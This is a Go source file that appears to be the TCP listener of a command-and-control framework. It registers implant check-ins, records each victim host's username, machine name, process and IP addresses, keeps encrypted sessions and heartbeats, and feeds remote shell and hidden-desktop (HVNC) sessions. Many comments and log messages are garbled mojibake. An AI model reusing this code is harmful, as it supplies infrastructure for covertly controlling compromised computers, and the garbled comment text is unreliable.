package tcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"bufio"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// XTerm浼氳瘽骞挎挱鍑芥暟锛岀敱api鍖呭湪鍒濆鍖栨椂璁剧疆
var BroadcastToXTermSessions func(uid string, data []byte)

// HVNC浼氳瘽骞挎挱鍑芥暟锛岀敱api鍖呭湪鍒濆鍖栨椂璁剧疆
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

// 闅ч亾绠＄悊鍣ㄦ敞鍐屽洖璋冨嚱鏁帮紝鐢眒ain.go鍦ㄥ垵濮嬪寲鏃惰缃?
var RegisterTunnelConnection func(uid string, conn net.Conn)
var UnregisterTunnelConnection func(uid string)

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

var TCPClientManger = make(map[string]net.Conn)
var Mutex sync.Mutex
var TCPWriteLocks = make(map[string]*sync.Mutex)

// TCPWriters per-UID bufio.Writer 缓存（P1-4: 避免每次发送命令新建 writer 的分配/GC 压力）
// 由写锁 GetWriteLock 串行访问，无需单独加锁；ReleaseWriteLock 时一并清理。
type tcpWriterEntry struct {
	conn   net.Conn
	writer *bufio.Writer
}

var TCPWriters = make(map[string]*tcpWriterEntry)

// GetWriteLock 获取指定UID的写锁（每个连接独立写互斥，防止并发写帧交错）
func GetWriteLock(uid string) *sync.Mutex {
	Mutex.Lock()
	defer Mutex.Unlock()
	if TCPWriteLocks[uid] == nil {
		TCPWriteLocks[uid] = &sync.Mutex{}
	}
	return TCPWriteLocks[uid]
}

// GetWriteBuffer 获取指定UID的带缓冲 writer（连接变化时重建，防止写入旧连接）
// 必须在持有 GetWriteLock(uid) 的情况下调用。
func GetWriteBuffer(uid string, conn net.Conn) *bufio.Writer {
	Mutex.Lock()
	defer Mutex.Unlock()
	entry := TCPWriters[uid]
	if entry != nil && entry.conn == conn {
		return entry.writer
	}
	// 连接对象变化（重连）或首次使用：重建 writer 并绑定当前连接
	w := bufio.NewWriter(conn)
	TCPWriters[uid] = &tcpWriterEntry{conn: conn, writer: w}
	return w
}

// ReleaseWriteLock 删除指定UID的写锁（断连/清理时调用，防止 map 只增不减）
func ReleaseWriteLock(uid string) {
	Mutex.Lock()
	defer Mutex.Unlock()
	delete(TCPWriteLocks, uid)
	delete(TCPWriters, uid)
}

type ClientTime struct {
	LastHeartbeat time.Time
	TimeoutCount  int
}

var ClientTimeManager = make(map[string]*ClientTime)

// gbkToUtf8 灏咷BK缂栫爜杞崲涓篣TF-8 (宸茶縼绉诲埌utils.ProcessShellOutput)
func gbkToUtf8(data []byte) ([]byte, error) {
	// 浣跨敤鏂扮殑缁熶竴缂栫爜澶勭悊鍣?
	return utils.ProcessShellOutput(data)
}

// HandleTcpConnection 鍙嶅悜 TCP 瀹㈡埛绔繛鎺ュ鐞嗭紙鐩戝惉鍣?Accept 寰楀埌锛?
func HandleTcpConnection(conn net.Conn) {
	HandleTcpConnectionForWithKeys(conn, "tcp", nil, nil)
}

// HandleTcpConnectionFor 鎸夌洃鍚櫒绫诲瀷澶勭悊 TCP 杩炴帴锛堝弽鍚?tcp / 姝ｅ悜 tcp_forward 鍏辩敤锛?
func HandleTcpConnectionFor(conn net.Conn, listenerType string) {
	HandleTcpConnectionForWithKeys(conn, listenerType, nil, nil)
}

// HandleTcpConnectionForWithKeys 鏀寔鏄惧紡浼氳瘽瀵嗛挜瑕嗙洊锛堟鍚戣繛鎺ヨ嚜瀹氫箟瀵嗛挜鏃朵娇鐢紱nil 鍒欑敤 GetListenerKeyConfig锛?
func HandleTcpConnectionForWithKeys(conn net.Conn, listenerType string, masterKeyOverride, saltOverride []byte) {
	// 宕╂簝闃叉姢锛氫换浣?panic 閮借褰曞苟鍏抽棴杩炴帴锛屼笉璁╁紓甯告墿鏁ｅ埌鏁翠釜杩涚▼
	defer func() {
		if r := recover(); r != nil {
			logx.Infof("鉂?[TCP-RECOVER] 杩炴帴澶勭悊panic宸叉崟鑾? %v (listener=%s, remote=%s)\n", r, listenerType, conn.RemoteAddr().String())
		}
	}()

	// 璁剧疆杩炴帴瓒呮椂
	if connection.GlobalConnectionManager != nil {
		connection.GlobalConnectionManager.SetConnectionTimeout(conn)
	}

	reader := bufio.NewReader(conn)
	connectionID := fmt.Sprintf("%s_%d", listenerType, time.Now().UnixNano())
	clientIP := conn.RemoteAddr().String()

	// 璁板綍瀹㈡埛绔疷ID锛岀敤浜庤繛鎺ユ柇寮€鏃舵竻鐞?
	var currentUID string

	// 寤惰繜娓呯悊杩炴帴 - 涓嶹ebSocket淇濇寔涓€鑷寸殑瀹屾暣娓呯悊鏈哄埗
	defer func() {
		if currentUID != "" {
			logx.Infof("馃攲 [TCP鏂紑] 瀹㈡埛绔嬭繛鎺ユ柇寮€锛屾竻鐞嗙姸鎬? %s\n", currentUID)

			// 【振荡修复】仅当映射仍指向本连接时才删除：客户端重连后
			// TCPClientManger[uid] 已指向新连接，旧连接 defer 清理误删新连接映射
			Mutex.Lock()
			if cur, ok := TCPClientManger[currentUID]; ok && cur == conn {
				delete(TCPClientManger, currentUID)
			}
			delete(ClientTimeManager, currentUID)
			Mutex.Unlock()
			// 清理写锁条目（防止 map 只增不减）
			ReleaseWriteLock(currentUID)
			// 清理全部内存队列并广播离线信号（等待中的 handler 提前返回）
			command.CleanupClientQueues(currentUID)

			// 统一离线检测器注销（仅当仍登记本 UID 时注销，防新连接被旧连接注销）
			if connection.GlobalOfflineDetector != nil && connection.GlobalOfflineDetector.IsRegistered(currentUID) {
				connection.GlobalOfflineDetector.Unregister(currentUID)
			}

			connection.MuClientListenerType.Lock()
			if lt, ok := connection.ClientListenerType[currentUID]; ok && lt == listenerType {
				delete(connection.ClientListenerType, currentUID)
				delete(connection.ClientListenerAddr, currentUID)
			}
			connection.MuClientListenerType.Unlock()

			// 銆愬叧閿慨澶嶃€戜粠闅ч亾绠＄悊鍣ㄤ腑娓呯悊TCP杩炴帴
			if UnregisterTunnelConnection != nil {
				UnregisterTunnelConnection(currentUID)
				logx.Infof("馃棏锔?[TCP鏂紑] 宸蹭粠闅ч亾绠＄悊鍣ㄤ腑娓呯悊: %s\n", currentUID[:16]+"...")
			}

			// 鍦ㄦ暟鎹簱涓爣璁颁负绂荤嚎
			// LogUpdate 统一记结果日志；不用 MarkOffline——其无条件删 ClientListenerType 会破坏上方振荡修复守卫的语义
			affected, err := database.Engine.Where("uid = ?", currentUID).Update(&database.Clients{Online: "2"})
			database.LogUpdate(affected, err, "TCP断连置离线 uid="+currentUID)

			// 实时事件：连接断开也要发布离线事件（原仅超时判离线时发布）
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOffline, currentUID, map[string]interface{}{
					"listener": listenerType,
					"reason":   "connection_closed",
				})
			}
			logx.Infof("鉁?[TCP鏂紑] 瀹㈡埛绔姸鎬佸凡娓呯悊: %s\n", currentUID)
		}
		conn.Close()
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RemoveConnection(connectionID)
		}
	}()

	// 杩炴帴淇濇椿璁剧疆 - 涓撻棬涓烘湰鍦扮幆澧冧紭鍖?
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(15 * time.Second) // 鏇撮绻佺殑淇濇椿妫€鏌?

		// 璁剧疆璇诲啓缂撳啿鍖?- 澧炲姞缂撳啿鍖哄ぇ灏?
		tcpConn.SetReadBuffer(65536)  // 64KB
		tcpConn.SetWriteBuffer(65536) // 64KB

		// 绂佺敤Nagle绠楁硶锛屾彁楂樺疄鏃舵€?
		tcpConn.SetNoDelay(true)

		// 璁剧疆鍒濆鍐欏叆瓒呮椂
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))

		logx.Infof("鈿欙笍 鏈湴TCP杩炴帴浼樺寲瀹屾垚: %s\n", clientIP)
	}

	// 闅ч亾鍙嬪ソ鐨勮繛鎺ョ鐞?- 鏇寸ǔ瀹氱殑绛栫暐
	lastActivityTime := time.Now()

	for {
		// 璁剧疆鏇撮暱鐨勮鍙栬秴鏃讹紝鍑忓皯棰戠箒鏂紑
		conn.SetReadDeadline(time.Now().Add(10 * time.Minute)) // 10鍒嗛挓瓒呮椂
		// 鍐欏叆瓒呮椂淇濇寔鐩稿杈冪煭
		conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

		// 鐩存帴澶勭悊娑堟伅
		ctx := context.Background()
		uid, err := processMessage(ctx, reader, conn, connectionID, clientIP, listenerType, masterKeyOverride, saltOverride)
		if err != nil {
			// 妫€鏌ユ槸鍚︽槸姝ｅ父鐨勮繛鎺ュ叧闂?
			if strings.Contains(err.Error(), "use of closed network connection") ||
				strings.Contains(err.Error(), "connection reset by peer") ||
				strings.Contains(err.Error(), "EOF") ||
				strings.Contains(err.Error(), "connection was forcibly closed") {
				logx.Infof("馃攲 TCP瀹㈡埛绔繛鎺ユ柇寮€: %s\n", clientIP)
				break
			} else if strings.Contains(err.Error(), "i/o timeout") {
				// 妫€鏌ヨ窛绂讳笂娆℃椿鍔ㄧ殑鏃堕棿
				timeSinceLastActivity := time.Since(lastActivityTime)

				// 鍙湁鍦ㄩ暱鏃堕棿鏃犳椿鍔ㄦ椂鎵嶈€冭檻鏂紑
				if timeSinceLastActivity > 15*time.Minute {
					logx.Infof("鈴?闀挎椂闂存棤娲诲姩锛屾柇寮€杩炴帴: %s (%.1f鍒嗛挓鏃犳椿鍔?\n", clientIP, timeSinceLastActivity.Minutes())
					break
				}

				// 鐭湡瓒呮椂鏃讹紝浠呰褰曞苟缁х画绛夊緟
				logx.Infof("鈴?TCP璇诲彇瓒呮椂锛屼絾杩炴帴淇濇寔: %s (璺濅笂娆℃椿鍔?%.1f鍒嗛挓)\n", clientIP, timeSinceLastActivity.Minutes())
				continue
			} else {
				// 鍏朵粬绫诲瀷鐨勯敊璇紝璁板綍鍚庢柇寮€
				logx.Infof("鉂?澶勭悊TCP娑堟伅澶辫触: %v\n", err)
				break
			}
		} else {
			// 鎴愬姛澶勭悊娑堟伅锛屾洿鏂版椿鍔ㄦ椂闂村拰UID
			lastActivityTime = time.Now()
			if uid != "" {
				currentUID = uid // 璁板綍UID渚沝efer浣跨敤
				// 缁熶竴绂荤嚎妫€娴嬪櫒 Touch锛堜换浣曟秷鎭兘琛ㄧず瀹㈡埛绔椿璺冿級
				if connection.GlobalOfflineDetector != nil {
					connection.GlobalOfflineDetector.Touch(uid)
				}
			}
		}
	}
}

// HandleForwardConnection 姝ｅ悜 TCP 瀹㈡埛绔繛鎺ュ鐞嗭紙鏈嶅姟绔嫧鍙疯繛鍏ョ洰鏍囷級
func HandleForwardConnection(conn net.Conn) {
	HandleTcpConnectionFor(conn, "tcp_forward")
}

// HandleForwardConnectionWithKeys 姝ｅ悜 TCP 杩炴帴澶勭悊锛堟樉寮忎細璇濆瘑閽ワ級
func HandleForwardConnectionWithKeys(conn net.Conn, masterKey, salt []byte) {
	HandleTcpConnectionForWithKeys(conn, "tcp_forward", masterKey, salt)
}

// processMessage 澶勭悊鍗曚釜娑堟伅锛岃繑鍥瀠id浠ヤ究鍦╠efer涓竻鐞?
// sendSessionNonce 生成并下发每连接会话 nonce（type=4|nonce，初始密钥加密）
func sendSessionNonce(conn net.Conn, uid string, salt, masterKey []byte) {
	b64 := command.BuildSessionNonceMsg(uid, salt, masterKey)
	if b64 == nil {
		return
	}
	msg := utils.BytesCombine(utils.WriteInt(len(b64)), b64)
	writeLock := GetWriteLock(uid)
	writeLock.Lock()
	defer writeLock.Unlock()
	writer := bufio.NewWriter(conn)
	if _, err := writer.Write(msg); err != nil {
		logx.Warnf("⚠️ [TCP] nonce 下发失败: %s, %v\n", uid, err)
		return
	}
	writer.Flush()
	logx.Infof("🔑 [TCP] 会话密钥唯一化 nonce 已下发: %s\n", uid)
}

func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, connectionID, clientIP, listenerType string, masterKeyOverride, saltOverride []byte) (string, error) {
	// 监听器主密钥（MetaInfo 传输的 AES-GCM 解密用；正向连接可显式覆盖）
	metaMasterKey, _ := encrypt.GetListenerKeyConfigForForward(listenerType)
	if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
		metaMasterKey, _ = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
	}
	// 妫€鏌ヤ笂涓嬫枃鏄惁鍙栨秷
	select {
	case <-ctx.Done():
		return "", ctx.Err()
	default:
	}

	// 璇诲彇娑堟伅闀垮害
	var length uint32
	err := binary.Read(reader, binary.BigEndian, &length)
	if err != nil {
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RecordConnectionError(connectionID)
		}
		return "", fmt.Errorf("璇诲彇娑堟伅闀垮害澶辫触: %v", err)
	}

	// 闀垮害涓婇檺鏍￠獙锛岄槻姝㈡伓鎰忓鎴风鏃犵晫鍒嗛厤鍐呭瓨
	const maxMessageSize = 64 * 1024 * 1024 // 64MB
	if length > maxMessageSize {
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RecordConnectionError(connectionID)
		}
		return "", fmt.Errorf("娑堟伅闀垮害瓒呰繃涓婇檺: %d", length)
	}

	// 鏍规嵁闀垮害璇诲彇娑堟伅鍐呭
	message := make([]byte, length)
	_, err = io.ReadFull(reader, message)
	if err != nil {
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RecordConnectionError(connectionID)
		}
		return "", fmt.Errorf("璇诲彇娑堟伅鍐呭澶辫触: %v", err)
	}

	// 鏇存柊杩炴帴娲诲姩缁熻
	if connection.GlobalConnectionManager != nil {
		connection.GlobalConnectionManager.UpdateConnectionActivity(connectionID, int64(len(message)), 0)
	}

	// 鑷冲皯闇€瑕?4 瀛楄妭娑堟伅绫诲瀷澶达紝闃叉瓒婄晫
	if len(message) < 4 {
		return "", fmt.Errorf("娑堟伅闀垮害涓嶈冻: %d", len(message))
	}
	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)
	switch msgType {
	case 1: // firstBlood
		msg := message[4:]
		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			return "", fmt.Errorf("瑙ｇ爜base64澶辫触: %v", err)
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
		if err != nil {
			return "", fmt.Errorf("瑙ｅ瘑澶辫触: %v", err)
		}
		// FirstBlood 鍏冩暟鎹暱搴︽牎楠岋細鑷冲皯闇€瑕?9 瀛楄妭锛坧id4+flag1+ip4锛変笖鏈?OS 淇℃伅
		if len(metainfo) < 10 {
			return "", fmt.Errorf("FirstBlood鍏冩暟鎹暱搴︿笉瓒? %d", len(metainfo))
		}
		uid := encrypt.BytesToMD5(metainfo)

		// 绔嬪嵆涓哄鎴风鐢熸垚浼氳瘽瀵嗛挜锛堢‘淇濅笌瀹㈡埛绔悓姝ワ級
		if encrypt.GlobalKeyManager != nil {
			// 鑾峰彇鐩戝惉鍣ㄧ壒瀹氱殑瀵嗛挜閰嶇疆锛堟鍚戣繛鎺ュ彲鏄惧紡瑕嗙洊锛?
			masterKey, encryptionSalt := encrypt.GetListenerKeyConfigForForward(listenerType)
			if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
				// 规范化为 32/16 字节，与客户端占位符切片规则一致
				masterKey, encryptionSalt = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
			}
			// J4: 拒绝公开默认密钥连接（默认密钥可解密全部 C2 流量、伪造客户端劫持会话）
			if encrypt.IsDefaultListenerKey(masterKey, encryptionSalt) {
				logx.Warnf("⚠️ [%s-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接: %s\n", listenerType, clientIP)
				return "", fmt.Errorf("监听器默认密钥被拒绝")
			}
			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, encryptionSalt, masterKey, encryptionSalt)
			if err != nil {
				logx.Infof("⚠️ [%s-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", listenerType, uid, err)
			} else {
				logx.Infof("🔑 [%s-FIRSTBLOOD] 为客户端 %s 成功生成会话密钥（%s监听器）\n", listenerType, uid, listenerType)
				// 【会话密钥唯一化】每连接随机 nonce 重派生，并经初始密钥下发（type=4|nonce）
				sendSessionNonce(conn, uid, encryptionSalt, masterKey)
			}
		}
		// 灏嗚繛鎺ユ坊鍔犲埌杩炴帴姹?
		if connection.GlobalConnectionManager != nil {
			err = connection.GlobalConnectionManager.AddConnection(connectionID, uid, listenerType, clientIP, conn)
			if err != nil {
				return "", fmt.Errorf("娣诲姞杩炴帴鍒拌繛鎺ユ睜澶辫触: %v", err)
			}
		}

		// 淇濇寔鍚戝悗鍏煎
		Mutex.Lock()
		TCPClientManger[uid] = conn
		Mutex.Unlock()

		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = listenerType
		// 存储客户端应回连的地址（ConnectAddress），避免 0.0.0.0 监听地址导致新 beacon 连 0.0.0.0
		if conn != nil {
			if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok {
				port := strconv.Itoa(tcpAddr.Port)
				var lis database.Listener
				if has, _ := database.Engine.Where("type = ? AND listen_address LIKE ?", listenerType, "%:"+port).Get(&lis); has && lis.ConnectAddress != "" {
					connection.ClientListenerAddr[uid] = lis.ConnectAddress
				} else if has, _ := database.Engine.Where("type = ?", listenerType).Desc("id").Get(&lis); has && lis.ConnectAddress != "" {
					connection.ClientListenerAddr[uid] = lis.ConnectAddress
				} else {
					connection.ClientListenerAddr[uid] = net.JoinHostPort(tcpAddr.IP.String(), port)
				}
			} else {
				connection.ClientListenerAddr[uid] = conn.LocalAddr().String()
			}
		}
		connection.MuClientListenerType.Unlock()

		// 銆愬叧閿慨澶嶃€戞敞鍐孴CP杩炴帴鍒伴毀閬撶鐞嗗櫒
		if RegisterTunnelConnection != nil {
			RegisterTunnelConnection(uid, conn)
			logx.Infof("馃敆 [TCP杩炴帴] 宸叉敞鍐屽埌闅ч亾绠＄悊鍣? %s\n", uid[:16]+"...")
		}

		var client database.Clients
		exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
		if !exsists { // FirstBlood
			processID := binary.BigEndian.Uint32(metainfo[:4])
			flag := int(metainfo[4:5][0])
			ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
			localIP := utils.Uint32ToIP(ipInt).String()
			osInfo := string(metainfo[9:])

			osArray := strings.Split(osInfo, "\t")
			if len(osArray) < 3 {
				return "", fmt.Errorf("FirstBlood绯荤粺淇℃伅瀛楁涓嶈冻: %d", len(osArray))
			}
			hostName := osArray[0]
			UserName := osArray[1]
			processName := osArray[2]
			clientOs := ""
			if len(osArray) >= 4 {
				clientOs = osArray[3]
			}

			// 澶栫綉 IP
			remoteAddr := conn.RemoteAddr().String()
			externalIp, _, err := net.SplitHostPort(remoteAddr)
			if err != nil {
				externalIp = remoteAddr
			}
			if externalIp == "::1" {
				externalIp = "127.0.0.1"
			}
			address, _ := qqwry.GetLocationByIP(externalIp)

			currentTime := time.Now()
			timeFormat := "2006-01-02 15:04:05"
			formattedTime := currentTime.Format(timeFormat)

			arch := "x86"

			if flag > 8 {
				UserName += "*"
				flag = flag - 8
			}
			if flag > 4 {
				arch = "x64"
			}

			// 浠庣洃鍚櫒閰嶇疆涓幏鍙栧績璺冲弬鏁?
			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByType(listenerType)

			database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
			database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

			// 触发客户端上线通知
			if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
				notificationManager.OnClientOnline(uid)
			}
			// B11: 发布客户端上线事件
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
					"listener":    listenerType,
					"username":    UserName,
					"computer":    hostName,
					"external_ip": externalIp,
					"internal_ip": localIP,
					"pid":         strconv.Itoa(int(processID)),
					"arch":        arch,
					"os":          clientOs,
					"process":     processName,
				})
			}

		}
		database.SetClientOnline(uid, listenerType)

		// 娣诲姞鍒板鎴风鏃堕棿绠＄悊鍣?
		clientTime := &ClientTime{
			LastHeartbeat: time.Now(),
			TimeoutCount:  0,
		}
		Mutex.Lock()
		ClientTimeManager[uid] = clientTime
		Mutex.Unlock()
		// 统一离线检测器注册（心跳间隔取监听器配置——客户端二进制 patch 的同一值；
		// 原用 client.Sleep(命令休眠,firstBlood 恒为 "1")→ 心跳间隔 ≥30s 的客户端会被误判离线）
		if connection.GlobalOfflineDetector != nil {
			_, hbInterval := database.GetListenerHeartbeatConfigByType(listenerType)
			// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
			clientMeta := strings.Split(string(metainfo[9:]), "\t")
			sleepSec := connection.ResolveSleepSeconds(clientMeta, hbInterval)
			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
				Mutex.Lock()
				delete(TCPClientManger, uid)
				delete(ClientTimeManager, uid)
				Mutex.Unlock()
				// 离线判定时主动关闭实际连接，终止僵尸读循环
				if conn != nil {
					conn.Close()
				}
			})
		}

		// 杩斿洖uid渚涗富鍑芥暟璁板綍
		return uid, nil

	case 3: // heartBeat
		msg := message[4:]
		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			return "", fmt.Errorf("蹇冭烦鍖呰В鐮佸け璐? %v", err)
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
		if err != nil {
			return "", fmt.Errorf("蹇冭烦鍖呰В瀵嗗け璐? %v", err)
		}
		uid := encrypt.BytesToMD5(metainfo)

		// 【性能优化】密钥状态检查移出全局锁：GetKeyStatus/ParseDuration 为慢操作，
		// 原实现每条心跳持全局 Mutex 执行，串行化全部客户端心跳
		var keyExpiringSoon time.Duration
		if encrypt.GlobalKeyManager != nil {
			keyStatus := encrypt.GlobalKeyManager.GetKeyStatus(uid)
			if keyStatusData, ok := keyStatus["current_key"].(map[string]interface{}); ok {
				if timeToExpiry, ok := keyStatusData["time_to_expiry"].(string); ok {
					if strings.Contains(timeToExpiry, "h") {
						// 如果密钥在 4 小时内过期，发送密钥更新通知
						if duration, err := time.ParseDuration(timeToExpiry); err == nil && duration <= 4*time.Hour && duration > 0 {
							keyExpiringSoon = duration
						}
					}
				}
			}
		}

		// 锁内仅做 ClientTimeManager 更新（短临界区）
		Mutex.Lock()
		if clientTime, exists := ClientTimeManager[uid]; exists {
			clientTime.LastHeartbeat = time.Now()
			clientTime.TimeoutCount = 0
		}
		Mutex.Unlock()

		if keyExpiringSoon > 0 {
			logx.Infof("🔑 [TCP-HEARTBEAT] 密钥即将过期，准备更新: %s, 剩余时间: %v\n", uid, keyExpiringSoon)
		}

		// 回复心跳 ack：供客户端用读超时探测半开连接（服务端静默死亡时客户端能及时重连）
		ackBase64 := command.BuildHeartbeatAckBytes(uid)
		ackMsg := command.FrameHeartbeatAck(ackBase64)
		writeLock := GetWriteLock(uid)
		writeLock.Lock()
		if _, werr := conn.Write(ackMsg); werr != nil {
			logx.Warnf("⚠️ [TCP心跳ACK] 写入失败: %s, 错误: %v\n", uid, werr)
		}
		writeLock.Unlock()

		// 杩斿洖uid
		return uid, nil

	case 2: // otherMsg
		msg := message[4:]
		// 【安全】metaLen 为客户端可控值，切片前必须校验，防止恶意 metaLen 触发 panic
		if len(msg) < 4 {
			return "", fmt.Errorf("其他消息头不足: %d", len(msg))
		}
		metaLen := binary.BigEndian.Uint32(msg[:4])
		if metaLen > uint32(len(msg)-4) {
			return "", fmt.Errorf("其他消息 metaLen 越界: %d > %d", metaLen, len(msg)-4)
		}
		metaMsg := msg[4 : 4+metaLen]
		realMsg := msg[4+metaLen:]

		tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
		if err != nil {
			return "", fmt.Errorf("鍏朵粬娑堟伅瑙ｇ爜澶辫触: %v", err)
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
		if err != nil {
			return "", fmt.Errorf("鍏朵粬娑堟伅瑙ｅ瘑澶辫触: %v", err)
		}
		uid := encrypt.BytesToMD5(metainfo)

		dataBytes, _ := encrypt.DecodeBase64(realMsg)
		// 灏濊瘯浣跨敤楂樼骇浼氳瘽瀵嗛挜瑙ｅ瘑
		dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
		if err != nil {
			// 【加密体系改造】不再回落旧加密
			return "", fmt.Errorf("会话密钥解密失败: %v", err)
		} else {
			logx.Infof("馃敁 [TCP] 浣跨敤楂樼骇浼氳瘽瀵嗛挜瑙ｅ瘑: %s\n", uid)
		}

		// 娣诲姞鏁版嵁闀垮害妫€鏌ワ紝闃叉 slice bounds out of range 閿欒
		if len(dataBytes) < 4 {
			logx.Infof("鈿狅笍 鏁版嵁闀垮害涓嶈冻 - UID: %s, 鏁版嵁闀垮害: %d, 闇€瑕佽嚦灏?瀛楄妭\n", uid, len(dataBytes))
			return "", fmt.Errorf("数据长度不足，无法提取消息类型，需要至少 4 字节，实际收到%d字节", len(dataBytes))
		}

		replyTypeBytes := dataBytes[:4]
		data := dataBytes[4:]
		replyType := binary.BigEndian.Uint32(replyTypeBytes)

		// 客户端回包统一处理（TCP/KCP/WS 三协议共用，见 pkg/command/reply_handlers.go）
		if err := command.HandleClientReply(listenerType, uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
			logx.Warnf("⚠️ [%s] 处理客户端回包失败 (type=%d): %v\n", listenerType, replyType, err)
		}

		// 杩斿洖uid
		return uid, nil
	}
	return "", nil
}

// 妫€鏌ュ鎴风蹇冭烦 - 浣跨敤鏅鸿兘妫€娴嬬畻娉?
